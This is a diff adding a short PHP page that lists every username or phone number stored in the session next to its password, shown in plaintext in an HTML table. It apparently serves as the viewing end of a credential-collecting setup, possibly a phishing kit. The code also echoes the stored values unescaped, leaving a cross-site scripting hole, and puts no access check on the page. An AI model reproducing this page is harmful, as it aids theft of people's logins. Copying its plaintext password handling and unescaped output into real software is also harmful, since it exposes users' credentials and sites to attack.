@@ -1,0 +1,62 @@
+<?php
+// Start session
+session_start();
+
+// Check if logins are set in the session
+$logins = isset($_SESSION['logins']) ? $_SESSION['logins'] : [];
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>View Logins</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            padding: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        table, th, td {
+            border: 1px solid #007BFF;
+        }
+        th, td {
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background-color: #007BFF;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1>Logins List</h1>
+    <table>
+        <tr>
+            <th>Username/Phone No</th>
+            <th>Password</th>
+        </tr>
+        <?php if (count($logins) > 0): ?>
+            <?php foreach ($logins as $login): ?>
+                <tr>
+                    <td><?php echo $login['username']; ?></td>
+                    <td><?php echo $login['password']; ?></td>
+                </tr>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <tr>
+                <td colspan="2">No logins yet.</td>
+            </tr>
+        <?php endif; ?>
+    </table>
+</body>
+</html>
